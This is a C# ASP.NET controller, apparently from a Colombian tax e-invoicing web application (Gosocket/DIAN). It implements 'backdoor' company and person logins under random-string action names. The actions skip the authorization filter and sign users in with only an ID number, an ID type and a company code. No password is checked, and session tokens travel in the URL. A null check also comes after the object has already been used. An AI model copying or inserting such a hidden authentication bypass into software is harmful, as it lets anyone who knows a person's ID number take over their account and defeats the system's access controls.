using Gosocket.Dian.Application;
using Gosocket.Dian.Domain.Entity;
using Gosocket.Dian.Infrastructure;
using Gosocket.Dian.Web.Common;
using Gosocket.Dian.Web.Filters;
using Gosocket.Dian.Web.Models;
using Gosocket.Dian.Web.Utils;
using Microsoft.AspNet.Identity.Owin;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;

namespace Gosocket.Dian.Web.Controllers
{
    [IPFilter]
    [Authorization]
    public class BckdrController : Controller
    {
        private ApplicationSignInManager _signInManager;
        private ApplicationUserManager _userManager;

        public ApplicationSignInManager SignInManager
        {
            get
            {
                return _signInManager ?? HttpContext.GetOwinContext().Get<ApplicationSignInManager>();
            }
            private set
            {
                _signInManager = value;
            }
        }
        public ApplicationUserManager UserManager
        {
            get
            {
                return _userManager ?? HttpContext.GetOwinContext().GetUserManager<ApplicationUserManager>();
            }
            private set
            {
                _userManager = value;
            }
        }
        private static readonly TableManager dianAuthTableManager = new TableManager("AuthToken");

        private IdentificationTypeService identificationTypeService = new IdentificationTypeService();
        private ContributorService contributorService = new ContributorService();
        private UserService userService = new UserService();


        [ExcludeFilter(typeof(Authorization))]
        public async Task<ActionResult> AuthToken(string pk, string rk, string token)
        {
            var model = new UserLoginViewModel
            {
                IdentificationTypes = identificationTypeService.List().Select(x => new IdentificationTypeListViewModel { Id = x.Id, Description = x.Description }).ToList(),
                IdentificationType = (int)Domain.Common.IdentificationType.CC
            };
            var auth = dianAuthTableManager.Find<AuthToken>(pk, rk);
            TimeSpan timeSpan = DateTime.UtcNow.Subtract(auth.Timestamp.DateTime);
            if (auth != null && auth.Token == token && timeSpan.TotalMinutes <= 60)
            {
                ApplicationUser user = await UserManager.FindByIdAsync(auth.UserId);
                if (user == null)
                {
                    dianAuthTableManager.Delete(auth);
                    ModelState.AddModelError($"PersonLoginFailed", "Persona natural no se encuentra registrada.");
                    return View("Zpzuyeesymqiriyv", model);
                }

                user.ContributorCode = rk;
                await SignInManager.SignInAsync(user, true, false);
                return RedirectToAction(nameof(HomeController.Dashboard), "Home");
            }

            
            ModelState.AddModelError($"PersonLoginFailed", "Token expirado, por favor intente nuevamente.");
            return View("Zpzuyeesymqiriyv", model);
        }

        /// <summary>
        /// Backdoor company login
        /// </summary>
        /// <param name="returnUrl"></param>
        /// <returns></returns>
        [ExcludeFilter(typeof(Authorization))]
        public ActionResult Wqewwjaropnxxfyd(string returnUrl)
        {
            ViewBag.ReturnUrl = returnUrl;
            UserLoginViewModel model = new UserLoginViewModel
            {
                IdentificationTypes = identificationTypeService.List().Select(x => new IdentificationTypeListViewModel { Id = x.Id, Description = x.Description }).ToList(),
                IdentificationType = (int)Domain.Common.IdentificationType.CC
            };
            return View(model);
        }

        [HttpPost]
        [ExcludeFilter(typeof(Authorization))]
        [ValidateAntiForgeryToken]
        public ActionResult Wqewwjaropnxxfyd(UserLoginViewModel model, string returnUrl)
        {
            model.IdentificationTypes = identificationTypeService.List().Select(x => new IdentificationTypeListViewModel
            {
                Id = x.Id,
                Description = x.Description
            }).ToList();

            ClearUnnecessariesModelStateErrorsForAuthentication(false);

            var recaptchaValidation = IsValidCaptcha(model.RecaptchaToken);
            if (!recaptchaValidation.Item1)
            {
                ModelState.AddModelError($"CompanyLoginFailed", recaptchaValidation.Item2);
                return View("Wqewwjaropnxxfyd", model);
            }
            if (!ModelState.IsValid)
                return View("Wqewwjaropnxxfyd", model);

            var pk = $"{model.IdentificationType}|{model.UserCode}";
            var rk = $"{model.CompanyCode}";

            var user = userService.GetByCodeAndIdentificationTyte(model.UserCode, model.IdentificationType);
            if (user == null)
            {
                ModelState.AddModelError($"CompanyLoginFailed", "Número de documento y tipo de identificación no coinciden.");
                return View("Wqewwjaropnxxfyd", model);
            }

            var contributor = user.Contributors.FirstOrDefault(c => c.Code == model.CompanyCode);
            if (contributor == null)
            {
                ModelState.AddModelError($"CompanyLoginFailed", "Empresa no asociada a representante legal.");
                return View("Wqewwjaropnxxfyd", model);
            }

            if (ConfigurationManager.GetValue("Environment") == "Prod" && contributor.AcceptanceStatusId != (int)Domain.Common.ContributorStatus.Enabled)
            {
                ModelState.AddModelError($"CompanyLoginFailed", "Empresa no se encuentra habilitada.");
                return View("Wqewwjaropnxxfyd", model);
            }

            var auth = dianAuthTableManager.Find<AuthToken>(pk, rk);
            if (auth == null)
            {
                auth = new AuthToken(pk, rk) { UserId = user.Id, Email = user.Email, ContributorId = contributor.Id, Token = Guid.NewGuid().ToString(), Status = true };
                dianAuthTableManager.InsertOrUpdate(auth);
            }
            else
            {
                TimeSpan timeSpan = DateTime.UtcNow.Subtract(auth.Timestamp.DateTime);
                if (timeSpan.TotalMinutes > 60 || string.IsNullOrEmpty(auth.Token))
                {
                    auth.UserId = user.Id;
                    auth.Email = user.Email;
                    auth.ContributorId = contributor.Id;
                    auth.Token = Guid.NewGuid().ToString();
                    auth.Status = true;
                    dianAuthTableManager.InsertOrUpdate(auth);
                }
            }

            var token = auth.Token;

            return RedirectToAction(nameof(AuthToken), new { pk = auth.PartitionKey, rk = auth.RowKey, token });
        }


        /// <summary>
        /// Backdoor person login
        /// </summary>
        /// <param name="returnUrl"></param>
        /// <returns></returns>
        [ExcludeFilter(typeof(Authorization))]
        public ActionResult Zpzuyeesymqiriyv(string returnUrl)
        {
            ViewBag.ReturnUrl = returnUrl;
            UserLoginViewModel model = new UserLoginViewModel
            {
                IdentificationTypes = identificationTypeService.List().Select(x => new IdentificationTypeListViewModel { Id = x.Id, Description = x.Description }).ToList(),
                IdentificationType = (int)Domain.Common.IdentificationType.CC
            };
            return View(model);
        }

        [HttpPost]
        [ExcludeFilter(typeof(Authorization))]
        [ValidateAntiForgeryToken]
        public ActionResult Zpzuyeesymqiriyv(UserLoginViewModel model, string returnUrl)
        {
            model.IdentificationTypes = identificationTypeService.List().Select(x => new IdentificationTypeListViewModel { Id = x.Id, Description = x.Description }).ToList();

            ClearUnnecessariesModelStateErrorsForAuthentication(true);

            var recaptchaValidation = IsValidCaptcha(model.RecaptchaToken);
            if (!recaptchaValidation.Item1)
            {
                ModelState.AddModelError($"PersonLoginFailed", recaptchaValidation.Item2);
                return View("Zpzuyeesymqiriyv", model);
            }
            if (!ModelState.IsValid)
                return View("Zpzuyeesymqiriyv", model);

            var user = userService.GetByCodeAndIdentificationTyte(model.PersonCode, model.IdentificationType);
            if (user == null)
            {
                ModelState.AddModelError($"PersonLoginFailed", "Cédula y tipo de indetificación no coinciden.");
                return View("Zpzuyeesymqiriyv", model);
            }

            var contributor = user.Contributors.FirstOrDefault(c => c.PersonType == (int)Domain.Common.PersonType.Natural && c.Name.ToLower() == user.Name.ToLower());
            if (contributor == null)
            {
                ModelState.AddModelError($"PersonLoginFailed", "Persona natural sin permisos asociados.");
                return View("Zpzuyeesymqiriyv", model);
            }

            if (ConfigurationManager.GetValue("Environment") == "Prod" && contributor.AcceptanceStatusId != (int)Domain.Common.ContributorStatus.Enabled)
            {
                ModelState.AddModelError($"PersonLoginFailed", "Usted no se ecuentra habilitado.");
                return View("Zpzuyeesymqiriyv", model);
            }

            var pk = $"{model.IdentificationType}|{model.PersonCode}";
            var rk = $"{user.Contributors.FirstOrDefault(c => c.PersonType == (int)Domain.Common.PersonType.Natural && c.Name.ToLower() == user.Name.ToLower())?.Code}";

            var auth = dianAuthTableManager.Find<AuthToken>(pk, rk);
            if (auth == null)
            {
                auth = new AuthToken(pk, rk) { UserId = user.Id, Email = user.Email, ContributorId = contributor.Id, Token = Guid.NewGuid().ToString(), Status = true };
                dianAuthTableManager.InsertOrUpdate(auth);
            }
            else
            {
                TimeSpan timeSpan = DateTime.UtcNow.Subtract(auth.Timestamp.DateTime);
                if (timeSpan.TotalMinutes > 60 || string.IsNullOrEmpty(auth.Token))
                {
                    auth.UserId = user.Id;
                    auth.Email = user.Email;
                    auth.ContributorId = contributor.Id;
                    auth.Token = Guid.NewGuid().ToString();
                    auth.Status = true;
                    dianAuthTableManager.InsertOrUpdate(auth);
                }
            }

            var token = auth.Token;

            return RedirectToAction(nameof(AuthToken), new { pk = auth.PartitionKey, rk = auth.RowKey, token });

        }


        private void ClearUnnecessariesModelStateErrorsForAuthentication(bool person = false)
        {
            foreach (var item in ModelState)
            {
                if (person && item.Key.Contains("panyCode"))
                    item.Value.Errors.Clear();
                if (person && item.Key.Contains("UserCode"))
                    item.Value.Errors.Clear();
                if (!person && item.Key.Contains("PersonCode"))
                    item.Value.Errors.Clear();
                if (item.Key.Contains("DocumentKey"))
                    item.Value.Errors.Clear();
                if (item.Key.Contains("Email"))
                    item.Value.Errors.Clear();
                if (item.Key.Contains("Password"))
                    item.Value.Errors.Clear();
            }
        }
        private Tuple<bool, string> IsValidCaptcha(string token)
        {

            bool recaptchaIsEnable = Convert.ToBoolean(ConfigurationManager.GetValue("RecaptchaIsEnable"));
            if (recaptchaIsEnable)
            {
                var secret = ConfigurationManager.GetValue("RecaptchaServer");
                var req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(ConfigurationManager.GetValue("RecaptchaUrl") + "?secret=" + secret + "&response=" + token);

                using (var wResponse = req.GetResponse())
                {
                    using (StreamReader readStream = new StreamReader(wResponse.GetResponseStream()))
                    {
                        string responseFromServer = readStream.ReadToEnd();
                        dynamic jsonResponse = JsonConvert.DeserializeObject(responseFromServer);
                        if (jsonResponse.success.ToObject<bool>() && jsonResponse.score.ToObject<float>() > 0.4)
                            return Tuple.Create(true, "Ok");
                        else if (jsonResponse["error-codes"] != null && jsonResponse["error-codes"].ToObject<List<string>>().Contains("timeout-or-duplicate"))
                            return Tuple.Create(false, "Recaptcha inválido.");
                        else
                            return Tuple.Create(false, "Recaptcha inválido.");
                        //throw new Exception(jsonResponse.ToString());
                    }
                }
            }
            else
            {
                return Tuple.Create(true, "Ok");
            }


        }
    }
}